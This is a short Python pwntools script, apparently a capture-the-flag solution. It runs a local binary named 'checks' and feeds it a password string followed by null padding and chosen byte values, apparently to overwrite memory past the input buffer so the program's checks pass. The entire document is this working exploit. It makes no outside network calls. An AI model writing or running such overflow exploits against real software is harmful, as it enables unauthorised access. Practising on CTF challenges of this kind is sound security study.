from pwn import *

p = process(['./checks'])
payload = 'password123' + '\x00'*65 + '\x11\x00\x00\x00\x3d\x00\x00\x00\xf5\x00\x00\x00\x37\x00\x00\x00\x32\x00\x00\x00'
p.sendline(payload)
print(p.recvall())